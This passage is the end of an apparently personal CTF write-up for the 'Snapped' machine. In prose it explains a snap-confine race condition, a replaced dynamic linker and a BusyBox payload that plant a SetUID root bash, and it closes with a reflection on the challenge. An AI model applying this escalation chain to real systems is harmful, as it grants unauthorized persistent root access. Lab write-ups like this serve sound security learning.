The fourth stage is where the race condition is triggered. The exploit carefully prepares a legitimate directory structure and launches the Snap process so it passes initial validation. Then, at a precise moment, it atomically replaces the directory with a manipulated version containing malicious components. Because the system does not re-check after this swap, the attacker’s content is mounted into a privileged context, effectively gaining control over what gets loaded inside the namespace.

After winning the race, the environment reflects the injected changes, showing that the attacker-controlled directory has been successfully integrated into the Snap filesystem view.

In the fifth stage, payload injection takes place inside this compromised namespace. Since the dynamic linker has been replaced earlier in the chain, only statically linked binaries function properly. A static BusyBox binary is introduced along with a script that performs privileged file operations, including copying a shell binary into a Snap-accessible location and setting its permissions so it becomes SetUID root.

At this point, the malicious linker has already been overwritten, and its behavior has been verified against the attacker’s payload. The execution chain is now set: when Snap-confine (running with elevated privileges) loads the fake dynamic linker, it executes the embedded payload, which escalates privileges and triggers the scripted actions.

Finally, the exploit is triggered through a Snap-confine execution cycle. This causes the payload chain to run, ultimately producing a SetUID-enabled Bash binary inside the Firefox Snap directory. This file persists outside the sandbox and effectively grants persistent root-level access on the system.

And after 4-5 mins:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FVKx2QKxz5m6jB1XEDnTd%252FScreenshot%2520%282372%29.png%3Falt%3Dmedia%26token%3Dcf8f80da-a905-47ac-8436-f9c693c85523&width=768&dpr=3&quality=100&sign=2712c8b4&sv=2)

I got the root shell!! We've successfully finished **Snapped**!!!

**Snapped** is a highly technical and well-designed machine that ties together multiple real-world concepts into a single exploitation chain. What starts as simple enumeration gradually evolves into a layered attack involving misconfigured services, exposed backup mechanisms, cryptographic misuse, and eventually a deep dive into Linux internals and privilege escalation via Snap.

The most impressive part of this challenge is how each stage builds on the previous one. From discovering the unauthenticated `/api/backup` endpoint and extracting sensitive data, to decrypting backups using leaked keys, and finally pivoting into a full root compromise through a complex Snapd race condition, everything feels intentional and realistically structured. It forces you to think beyond isolated vulnerabilities and instead understand how small weaknesses can combine into a full attack path.
